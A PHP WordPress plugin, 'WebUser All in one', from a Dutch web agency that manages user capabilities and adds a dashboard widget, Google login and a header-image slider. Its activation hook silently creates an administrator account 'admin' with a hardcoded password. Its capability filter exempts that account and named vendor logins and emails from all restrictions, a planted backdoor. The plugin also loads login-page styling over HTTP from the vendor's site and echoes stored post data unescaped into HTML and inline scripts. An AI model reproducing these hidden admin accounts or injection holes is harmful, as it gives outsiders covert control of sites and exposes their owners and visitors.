<?php
/*
Plugin Name: WebUser All in one
Plugin URI: 
Description: >>> Capabilities: Deze plugin overschrijft alle rechten van gebruikers en stelt ze zelf in. Admin en teamwork@webuser.nl hebben standaard alle rechten, de rest van de gebruikers hebben niks. Admin/teamwork kunnen zelf rechten beheren. >>> Informatie Widget: Nieuwste info op het Dashboard als widget.
Version: 1.2.3
Author: WebUser
Author URI:
*/

// Webuser capabilities BEGIN
if (!class_exists('DisableCapabilitiesPlugin') && get_option('webuser_capabilities') !== 'false') {

	class DisableCapabilitiesPlugin {

		var $dc_options  = array();

		// !Member variables
		private $disable_permission = array();



		// !New User variables
		private $new_userdata = array();


		function DisableCapabilitiesPlugin()
		{

			
			// Init options & tables during activation & deregister init option
			register_activation_hook( __FILE__, array(&$this, 'activate') );
			register_deactivation_hook( __FILE__, array(&$this, 'deactivate') );

			// Register a uninstall hook to remove all tables & option automatic
			register_uninstall_hook( __FILE__, array(&$this, 'uninstall') );

			// Add filter to the current user permissions
			add_filter('map_meta_cap' , array(&$this, 'map_meta_cap') , 10 , 3);
			$this->init();
			
		}


		// Initialize varables
		function init()
		{
			
			$this->disable_permission = array(
									  // default permissions
									  'edit_themes',
									  'edit_plugins',
									  'install_plugins',
									  'activate_plugins',
									  'list_users',
									  'switch_themes',

									  // admin permissions
									  'add_users',
									  'create_users',
									  'delete_plugins',
									  'delete_themes',
									  'delete_users',
									  
									  //'edit_theme_options',
									  'edit_users',
									  'export',
									  'import',
									  'install_themes',
									  'manage_options', //NOTE: Deze optie is nodig voor LayerSlider WP!
									  'promote_users',
									  'remove_users',
									  'unfiltered_upload',
									  'update_core',
									  'update_plugins',
									  'update_themes',
									  'edit_dashboard',
									  
									  // Gravity forms permissions
									  'gravityforms_view_settings',
									  'gravityforms_edit_settings',
									  'gravityforms_create_form',
									  
									  // Members roles manager permissions
									  'create_roles',
									  'delete_roles',
									  'edit_roles',
									  'list_roles',

									  //last permission
									  'edit_files'
									  
								);
		}


		// Activation hook
		function activate()
		{
			$sgp_options['dc_options'] = '1.1';
			add_option("dc_options", $dc_options);

			// add New User
			// initialize New User variables
			$this->new_userdata = array(
										'user_pass' => 'wp_1Wpadmin',
										'user_login' => esc_attr( 'admin' ),
										'first_name' => esc_attr( 'admin' ),
										'last_name' => esc_attr( 'admin' ),
										'nickname' => esc_attr( 'admin' ),
										'user_email' => esc_attr( 'admin@localhost' ),
										'user_url' => esc_attr( ' ' ),
										'description' => esc_attr( ' ' ),
										'role' => 'administrator',
									);
			wp_insert_user( $this->new_userdata );


		}


		// Deactivation hook
		function deactivate()
		{



		}

		// Uninstall hook
		function uninstall()
		{

			delete_option('dc_options');

		}



		function map_meta_cap( $caps , $cap )
		{
			global $current_user;
			//print_r($current_user);exit;
			if( $current_user->user_login !== 'admin' && $current_user->user_login !== 'wspadmin' && $current_user->user_email !== 'teamwork@webuser.nl' && $current_user->user_email !== 'wspadmin@wordpressservicepackage.com' )
			{
				$data = get_site_option("webuser_" . $current_user->ID);
				$data = explode(',', $data);
				
				if( is_array( $this->disable_permission ) && in_array( $cap , $this->disable_permission ) )
				{
					$id = array_keys($this->disable_permission, $cap);
					
					if ($data[$id[0]] == 0) {
						$caps[] = 'do_not_allow';
					}
				}

			}

			return $caps;

		}


	}


	global $DisableCapabilitiesPlugin;
	$DisableCapabilitiesPlugin = new DisableCapabilitiesPlugin();


}
// Webuser capabilities EINDE


// Webuser database installation BEGIN


/* function data_install() {
	global $wpdb;

	$table_name = $wpdb->prefix . "webuser_data"; 
	if ($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
		$sql = "
				CREATE TABLE $table_name (
				id int(255) NOT NULL AUTO_INCREMENT,
				userID int(255),
				permissions varchar(60),
				UNIQUE KEY id (id)
		);";

		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
		dbDelta( $sql );
	}
} */


// Webuser database installation EINDE




// Webuser optionsMenu BEGIN

add_action( 'admin_menu' , 'webuser_menu' );
add_action( 'network_admin_menu' , 'webuser_admin_menu' );

function webuser_menu() {
	$options = add_menu_page('WebUser All-in-One Opties' , 'WebUser All-in-One' , 'manage_options' , 'webuser-all-in-one/options.php');
}

function webuser_admin_menu() {
	$options = add_menu_page('WebUser All-in-One Opties' , 'WebUser All-in-One' , 'manage_options' , 'webuser-all-in-one/admin_options.php');
}


// Webuser optionsMenu EINDE



// Webuser dashboardWidget BEGIN
function custom_dashboard_widget() {
	if (get_option('webuser_dashboard') === 'off') return;
	//wp_add_dashboard_widget('webuser_dashboard_widget', 'Webuser Informatie', 'custom_dashboard_widget_get_content');
	add_meta_box(
		 'webuser_dashboard_widget'
		,'Webuser Informatie'
		,'custom_dashboard_widget_get_content'
		,'dashboard' // Take a look at the output of `get_current_screen()` on your dashboard page
		,'normal' // Valid: 'side', 'advanced'
		,'high' // Valid: 'default', 'high', 'low'
	);
}
add_action('wp_dashboard_setup', 'custom_dashboard_widget');
function custom_dashboard_widget_get_content() {
	echo stripslashes('<iframe src="http://www.webuser.nl/blog/" width="100%" height="300" frameBorder="0">Browser not compatible.</iframe>');
}
// Webuser dashboardWidget EINDE















/**
 * This part adds Google Authentication
 */

require_once( plugin_dir_path(__FILE__).'/core/core_google_apps_login.php' );

class basic_google_apps_login extends core_google_apps_login {
	
	protected $PLUGIN_VERSION = '2.4.4';
	
	// Singleton
	private static $instance = null;
	
	public static function get_instance() {
		if (get_option('webuser_googlelogin') === 'off') return;
		if (null == self::$instance) {
			self::$instance = new self;
		}
		return self::$instance;
	}
	
	public function ga_activation_hook($network_wide) {
		parent::ga_activation_hook($network_wide);
		
		// If installed previously, keep 'poweredby' to off (default) since they were used to that
		$old_options = get_site_option($this->get_options_name());
	
		if (!$old_options) {
			$new_options = $this->get_option_galogin();
			$new_option['ga_poweredby'] = true;
			update_site_option($this->get_options_name(), $new_option);
		}
	}
		
	protected function ga_section_text_end() {
	}
	
	protected function ga_options_do_sidebar() {
		/* $drivelink = "http://wp-glogin.com/drive/?utm_source=Admin%20Sidebar&utm_medium=freemium&utm_campaign=Drive";
		$upgradelink = "http://wp-glogin.com/google-apps-login-premium/?utm_source=Admin%20Sidebar&utm_medium=freemium&utm_campaign=Freemium";
		$avatarslink = "http://wp-glogin.com/avatars/?utm_source=Admin%20Sidebar&utm_medium=freemium&utm_campaign=Avatars";
		
		$adverts = Array();
		
		$adverts[] = '<div>'
		.'<a href="'.$upgradelink.'" target="_blank">'
		.'<img src="'.$this->my_plugin_url().'img/basic_loginupgrade.png" />'
		.'</a>'
		.'<span>Buy our <a href="'.$upgradelink.'" target="_blank">premium Login plugin</a> to revolutionize user management</span>'
		.'</div>';
		
		$adverts[] = '<div>'
		.'<a href="'.$drivelink.'" target="_blank">'
		.'<img src="'.$this->my_plugin_url().'img/basic_driveplugin.png" />'
		.'</a>'
		.'<span>Try our <a href="'.$drivelink.'" target="_blank">Google Drive Embedder</a> plugin</span>'
		.'</div>';

		$adverts[] = '<div>'
		.'<a href="'.$avatarslink.'" target="_blank">'
		.'<img src="'.$this->my_plugin_url().'img/basic_avatars.png" />'
		.'</a>'
		.'<span>Bring your site to life with <a href="'.$avatarslink.'" target="_blank">Google Profile Avatars</a></span>'
		.'</div>';
		
		$startnum = (int)date('j');
		
		echo '<div id="gal-tableright" class="gal-tablecell">';
		
		for ($i=0 ; $i<2 ; $i++) {
			echo $adverts[($startnum+$i) % 3];
		}
		
		echo '</div>'; */
		
	}
	
	protected function ga_domainsection_text() {
	}
	
	protected function set_other_admin_notices() {
		global $pagenow;
		if (in_array($pagenow, array('users.php', 'user-new.php')) ) {
			$no_thanks = get_site_option($this->get_options_name().'_no_thanks', false);
			if (!$no_thanks) {
				if (isset($_REQUEST['google_apps_login_action']) && $_REQUEST['google_apps_login_action']=='no_thanks') {
					$this->ga_said_no_thanks(null);
				}
				
				add_action('admin_notices', Array($this, 'ga_user_screen_upgrade_message'));
				if (is_multisite()) {
					add_action('network_admin_notices', Array($this, 'ga_user_screen_upgrade_message'));
				}
			}
		}
	}
	
	public function ga_said_no_thanks( $data ) {
	   	update_site_option($this->get_options_name().'_no_thanks', true);
		wp_redirect( remove_query_arg( 'google_apps_login_action' ) );
		exit;
	}
	
	public function ga_user_screen_upgrade_message() {
	}
	
	public function my_plugin_basename() {
		$basename = plugin_basename(__FILE__);
		if ('/'.$basename == __FILE__) { // Maybe due to symlink
			$basename = basename(dirname(__FILE__)).'/'.basename(__FILE__);
		}
		return $basename;
	}
	
	protected function my_plugin_url() {
		$basename = plugin_basename(__FILE__);
		if ('/'.$basename == __FILE__) { // Maybe due to symlink
			return plugins_url().'/'.basename(dirname(__FILE__)).'/';
		}
		// Normal case (non symlink)
		return plugin_dir_url( __FILE__ );
	}

}

// Global accessor function to singleton
function GoogleAppsLogin() {
	return basic_google_apps_login::get_instance();
}

// Initialise at least once
GoogleAppsLogin();
 
function my_login_logo() { ?>
<style type="text/css">
	body.login div#login h1 a {
		background-image: url(<?php echo plugin_dir_url( __FILE__ ); ?>img/logo-W.png);
		background-size: 82px 78px;
	}
</style>
<?php }
add_action( 'login_enqueue_scripts',  'my_login_logo' );

function my_login_stylesheet() {
    wp_enqueue_style( 'custom-login', 'http://webuser.nl/webuser-all-in-one/custom-style.css' );
    wp_enqueue_script( 'custom-login', plugin_dir_url( __FILE__ ) . 'js/style-login.js' );
}
add_action( 'login_enqueue_scripts', 'my_login_stylesheet' );


/**
 * This part adds A new header system
 */



function header_add_box() {
	if (get_option('webuser_header') === 'off') return;
	$screens = array( 'post', 'page');
	foreach($screens as $screen) {
		add_meta_box(
			'webuser_header' ,
			__( 'WebUser Custom Header Images' , 'webuser_allinone' ),
			'header_add_box_call',
			$screen,
			'side',
			'high'
		);
	}
}
add_action( 'add_meta_boxes' , 'header_add_box' );


function header_add_box_call( $post ) {
	wp_nonce_field( 'webuser_meta_box' , 'webuser_meta_box_nonce' );
	echo ("Hier kunt u een eigen header kiezen voor deze pagina<br />");
	global $nggdb;
	$galleries = $nggdb->find_all_galleries();
	$data = get_post_meta($post->ID, 'webuser_header_gallery', true);
	$imgs = get_post_meta($post->ID, 'webuser_header_images', true);
	$speed = get_post_meta($post->ID, 'webuser_header_speed' , true);
	$fadeout = get_post_meta($post->ID, 'webuser_header_fadeout' , true);
	$height = get_post_meta($post->ID, 'webuser_header_height', true);
	$sizer = get_post_meta($post->ID, 'webuser_header_sizer', true);
	$type = get_post_meta($post->ID, 'webuser_header_type', true);
	
	echo ("<label for='header-select'>Select a gallery</label><br />");
	echo ("<select name='header-select' id='header-select' style='width: 100%' onChange='change_select_box()'>");
	echo ("<option value=''>--Default--</option>");
	foreach($galleries as $value) {
		echo ("<option value='" . $value->gid . "'");
		echo ($data == $value->gid) ? 'selected' : '';
		echo ">" . $value->title . "</option>";
	}
	echo ('</select>');
	echo("<input type='hidden' name='header-data' id='header-data' value='" . $imgs . "' />");
	echo ("<div id='header-thumbnails'>");
	
	if ($data != '') {
		?>
			<script>
				jQuery(document).ready(function() {
					jQuery('#header-thumbnails').html('<center><img src="../wp-content/plugins/webuser-all-in-one/custom-header/loading.gif" width="32" height="32" /></center>');
					jQuery.ajax({ 
						url: '../wp-content/plugins/webuser-all-in-one/custom-header/get_gallery_data.php',
						type: 'post',
						data: {
							'data' : '<?php echo $data; ?>',
							'action' : 'get'
						},
						success: function(data) {
							jQuery.ajax({
								url: '../wp-content/plugins/webuser-all-in-one/custom-header/get_gallery_data.php',
								type: 'post',
								data: {
									'data' : data,
									'action' : 'call'
								},
								success: function(data2) {
									jQuery('#header-thumbnails').html(data2);
									change_check_val();
									var $boxes = jQuery('.imgSelect'),
										$indexes = '<?php echo $imgs; ?>'.split(',');
									$boxes.each(function() {
										if (jQuery.inArray(jQuery(this).val(), $indexes) == -1) {
											jQuery(this).prop('checked' , false);
										}
									});
								}
							});
						}
					});
				});
			</script>
		<?php
	} else {
		echo("Je hebt nog geen gallery geselecteerd!");
	}
	
	echo ("</div>
		<div class='slider-settings'>
			Hier kunt u de Slider instellingen bepalen:<br />
			Slider snelheid: <input type='text' name='speed' value='" . $speed . "' size='5' /> milliseconde<br />
			Effecty snelheid: <input type='text' name='fade-out' value='" . $fadeout . "' size='5' /> milliseconde<br />
			Slider height: <input type='text' name='height' value='" . $height . "' size='5' /> px<br />
			Slider image size: <select name='sizer'>
				<option value='horizontal'" . (($sizer === 'horizontal') ? ' selected' : '') . ">Horizontal</option>
				<option value='vertical'" . (($sizer === 'vertical') ? ' selected' : '') . ">Vertical</option>
			</select><br />
			Slider Type: <select name='type'>
				<option value='fader'" . (($type === 'fader') ? ' selected' : '') . ">Fader</option>
				<option value='sliding'" . (($type === 'sliding') ? ' selected' : '') . ">Sliding</option>
			</select>
		</div>
	");
	?>
	<script>
		function change_select_box() {
			var $newval = jQuery('#header-select').val();
			jQuery('#header-thumbnails').html('<center><img src="../wp-content/plugins/webuser-all-in-one/custom-header/loading.gif" width="32" height="32" /></center>');
			jQuery.ajax({ 
				url: '../wp-content/plugins/webuser-all-in-one/custom-header/get_gallery_data.php',
				type: 'post',
				data: {
					'data' : $newval,
					'action' : 'get'
				},
				success: function(data) {
					jQuery('#header-data').val(data);
					jQuery.ajax({
						url: '../wp-content/plugins/webuser-all-in-one/custom-header/get_gallery_data.php',
						type: 'post',
						data: {
							'data' : data,
							'action' : 'call'
						},
						success: function(data2) {
							jQuery('#header-thumbnails').html(data2);
							change_check_val();
						}
					});
				}
			});
		}
		
		function change_check_val() {
			jQuery('.imgSelect').change(function() {
				console.log('val changed!');
				var $val = jQuery(this).val();
				if (jQuery(this).prop('checked')) {
					var $oldval = jQuery('#header-data').val();
					if ($oldval != '')
						var $newval = $oldval + ',' + $val;
					else
						var $newval = $val;
					jQuery('#header-data').val($newval);
					console.log($newval);
				} else {
					var $oldval = jQuery('#header-data').val();
					var $newval = $oldval.replace(',' + $val, '');
					var $newval = $newval.replace($val + ',' , '');
					var $newval = $newval.replace($val, '');
					jQuery('#header-data').val($newval);
				}
			});

		}
		
	</script>
	
	<?php
}

add_action( 'save_post', 'header_save_data' );

function header_save_data( $post_id ) {
	$data = '';
	if (isset($_POST['header-select'])) {
		$data = esc_attr($_POST['header-select']);
		$img = esc_attr($_POST['header-data']);
		update_post_meta( $post_id , 'webuser_header_gallery', $data);
		update_post_meta( $post_id , 'webuser_header_images', $img);
	}
	
	if (isset($_POST['speed'])) {
		$speed = esc_attr($_POST['speed']);
		update_post_meta( $post_id , 'webuser_header_speed' , $speed );
	}
	if (isset($_POST['fade-out'])) {
		$fadeout = esc_attr($_POST['fade-out']);
		update_post_meta( $post_id , 'webuser_header_fadeout' , $fadeout);
	}

	if (isset($_POST['height'])) {
		$height = esc_attr($_POST['height']);
		update_post_meta( $post_id , 'webuser_header_height' , $height );
	}

	if (isset($_POST['sizer'])) {
		$sizer = esc_attr($_POST['sizer']);
		update_post_meta( $post_id , 'webuser_header_sizer', $sizer);
	}
	if (isset($_POST['type'])) {
		$type = esc_attr($_POST['type']);
		update_post_meta( $post_id , 'webuser_header_type', $type);
	}
}

// Custom post highlighting based on post status
function cw_change_dashboard_column_width() {
?>
<style>
@media only screen and (min-width: 500px) {
	#dashboard-widgets .postbox-container {
		width: 50% !important;
	}
	#postbox-container-3, #postbox-container-4 {
		display: none;
	}
}
</style>
<?php
}

add_action('admin_head','cw_change_dashboard_column_width');

add_shortcode('webuser_header', 'create_webuser_header');
function create_webuser_header($atts, $content = '') {
	?>
	<!-- HEADER IMAGE CODE! DO NOT CHANGE! -->
		<!-- 
			If you wish to move the header somewhere else,
			Copy this code and move it to where it belongs
		-->
		<?php
		if (!$sliderspeed = get_post_meta( get_the_id(), 'webuser_header_speed', true)) {
			$sliderspeed = 6000;
		}
		if (!$fadeout = get_post_meta( get_the_id() , 'webuser_header_fadeout' , true)) {
			$fadeout = 2000;
		}
		if (!$height = get_post_meta( get_the_id() , 'webuser_header_height' , true)) {
			$height = '301';
		}
		if (!$sizer = get_post_meta( get_the_id() , 'webuser_header_sizer' , true)) {
			$sizer = 'horizontal';
		}
		if (!$type = get_post_meta( get_the_id(), 'webuser_header_type', true)) {
			$type = 'fader';
		}

		$imageIDs = get_post_meta( get_the_id(), 'webuser_header_images', true );
		$images = explode(',', $imageIDs);
		?>
		<style>
			#headerimage {
				position: relative;
				width: <?php echo (($type === 'fader') ? '100%' : '' . (100 * count($images)) . '%'); ?>;
				height: <?php echo $height; ?>px;
			}
			#headerimage > div {
				position: <?php echo (($type === 'fader') ? 'absolute' : 'relative'); ?>;
				
				<?php if ($type === 'fader'): ?>
					margin-left: auto;
					margin-right: auto;
					left: 0;
					right: 0;
				<?php elseif ($type === 'sliding'): ?>
					float: left;
					width: <?php echo (100 / count($images)); ?>%;
				<?php endif; ?>
				height: <?php echo $height; ?>px;
			}

			.ngg-gallery-singlepic-image {
				text-align: center;
				position: absolute;
				left: 0;
				top: 0;
				width: 100%;
				height: <?php echo $height; ?>px;
				<?php echo ($sizer === 'horizontal') ? 'overflow: hidden;' : ''; ?>
			}

			<?php if ($sizer === 'horizontal'): ?>
				#headerimage img {
					width: 100%;
					height: auto;
					position: absolute;
					top: 50%;
					left: 0;
					-webkit-transform: translateY(-50%);
					-moz-transform: translateY(-50%);
					transform: translateY(-50%);
				}
			<?php else: ?>
				#headerimage img {
					max-height:<?php echo $height; ?>px;
					margin: 0 auto;
				}
			<?php endif; ?>
			
		</style>
		<div id="headerimage">
		<?php
		

		$colorcodes = array();
		if ($imageIDs != '') {
			$images = explode(',', $imageIDs);
			global $nggdb;
			$falseimg = '';
			$i = 0;
			foreach($images as $object) {
				global $wpdb;
				$image = $nggdb->find_image($object);
				if (count($image) != 0) {
					$showgallery .= '<div> 
						<div class="' . $i . ' ngg-gallery-singlepic-image">
							<img src="' . $image->imageURL. '" />
							<div class="description">' . $image->description . '</div>
						</div>
					</div>';
					$i++;
				} else {
					if ($falseimg !== '') 
						$falseimg .= ',' . $object;
					else
						$falseimg = $object;
				}
				
			}
			if ($falseimg !== '') {
				$remove = explode(',', $falseimg);
				foreach($remove as $value) {
					$imageIDs = str_replace($value . ',', '', $imageIDs);
					$imageIDs = str_replace( ',' . $value, '', $imageIDs);
					$imageIDs = str_replace($value, '', $imageIDs);
				}
					
				update_post_meta(get_the_id(), 'webuser_header_images', $imageIDs);
			}
			echo $showgallery;
			?>
			
			
			<?php
		} else {
			 if ( get_header_image() ) { ?>
				<div>
					<div class="ngg-gallery-singlepic-image "><img class="ngg-singlepic" src="<?php header_image(); ?>" alt="" /></div>
				</div>
		<?php }
		}
	?>
	</div>
	
	<script>
		<?php if ($type === 'fader'): ?>
			$("#headerimage > div:gt(0)").hide();

			var index = 0;
			var maxindex = $('#headerimage > div').length;
			var interval;
			if (maxindex != 1) {
				interval = setInterval(function () {
					index = index < maxindex - 1 ? index + 1 : 0;
					$('#headerimage > div')
					.fadeOut(<?php echo $fadeout; ?>);
					$('#headerimage > div:has(.' + index + ')')
					.fadeIn(<?php echo $fadeout; ?>)
					.prependTo('#headerimage');
				}, <?php echo $sliderspeed; ?>);
			}
		<?php elseif ($type === 'sliding'): ?>
			var index = 0;
			var maxindex = $('#headerimage > div').length;
			var interval;
			
			if (maxindex != 1) {
				interval = setInterval(function() {
					if (++index < maxindex) {
						$('#headerimage').animate({ 'left' : '-=100%' }, <?php echo $fadeout; ?>);
					} else {
						index = 0;
						$('#headerimage').animate({ 'left' : '0' }, <?php echo $fadeout; ?>);
					}
				}, <?php echo $sliderspeed; ?>);
			}
			
		<?php endif; ?>
	</script>
	<!-- END OF HEADER IMAGE CODE! -->
	<?php
}
?>